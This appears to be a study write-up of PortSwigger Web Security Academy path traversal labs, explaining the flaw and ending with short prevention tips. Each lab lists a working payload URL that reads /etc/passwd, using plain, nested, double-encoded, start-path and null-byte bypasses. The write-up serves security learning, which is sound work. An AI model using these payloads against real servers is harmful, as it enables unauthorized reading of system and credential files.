
Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

## Example

Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:

`<img src="/loadImage?filename=218.png">`

The `loadImage` URL takes a `filename` parameter and returns the contents of the specified file. The image files are stored on disk in the location `/var/www/images/`. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:

`/var/www/images/218.png`

This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

This causes the application to read from the following file path:

`/var/www/images/../../../etc/passwd`

The sequence `../` is valid within a file path, and means to step up one level in the directory structure. The three consecutive `../` sequences step up from `/var/www/images/` to the filesystem root, and so the file that is actually read is:

`/etc/passwd`

###### Lab: File path traversal, simple case

- Just open an image in another tab:

```http
https://0aef00e40444983780e7c207009c002e.web-security-academy.net/image?filename=7.jpg
```

- Change the filename in:

`/image?filename=../../../../etc/passwd`

## Common obstacles to exploiting path traversal vulnerabilities

Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.

If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.

### Absolute file path bypass

You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.

###### Lab: File path traversal, traversal sequences blocked with absolute path bypass

This lab contains a path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

- Open an image in another tab:

```http
https://0aef00e40444983780e7c207009c002e.web-security-academy.net/image?filename=7.jpg
```

- Change the filename in:

`/etc/passwd`

### Nested traversal sequences bypass

You might be able to use nested traversal sequences, such as `....//` or `....\/`. These revert to simple traversal sequences when the inner sequence is stripped.
###### Lab: File path traversal, traversal sequences stripped non-recursively

The application strips path traversal sequences from the user-supplied filename before using it.

```http
https://0a0000cd0491ce578327d7a000060052.web-security-academy.net/image?filename=....//....//....//....//etc//passwd
```


### Encoded traversal sequence bypass 

In some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively.

###### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

- Open an image in another tab and double URL-encode the path traversal sequence:

```http
https://0a99007f03a1856384c2bd1200a3007c.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

### Validation of start path bypass

An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`.

###### Lab: File path traversal, validation of start of path

- Open an image in another tab and use the usual path traversal sequence but starting with `/var/www/images`:

```http
https://0aad00a604c81e9580a0f8e300df0028.web-security-academy.net/image?filename=/var/www/images/../../../../etc/passwd
```

### File extension with null byte bypass

An application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: `filename=../../../etc/passwd%00.png`

###### Lab: File path traversal, validation of file extension with null byte bypass

- Open an image in another tab and use the usual path traversal sequence but ending with a null byte `%00` and a valid file extension  `.jpg`:

```http
https://0a7a000803b96fc6817fd9dc000a00e8.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg
```

## Prevention

- Don’t use strings! Use instead filesystem APIs
- Get the canonical form of the path and validate it against your business rules



